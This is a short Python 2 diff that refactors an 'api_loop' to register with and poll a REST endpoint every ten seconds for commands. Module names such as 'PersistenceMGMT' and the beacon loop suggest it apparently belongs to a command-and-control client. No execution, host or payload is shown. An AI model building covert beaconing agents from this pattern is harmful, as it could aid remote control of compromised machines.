@@ -2,7 +2,7 @@ import argparse
 from os import sys, path
 
 sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
-from .rest import *
+from .rest import Rester
 from .lib.persistance import PersistenceMGMT
 from .db.SQLite import Helper
 from .settings import commands
@@ -36,9 +36,10 @@ def init():
 
 def api_loop():
     from time import sleep
-    register()
+    rest = Rester()
+    rest.register()
     while True:
-        cmds = beacon()
+        cmds = rest.beacon()
         print cmds
         sleep(10)
 
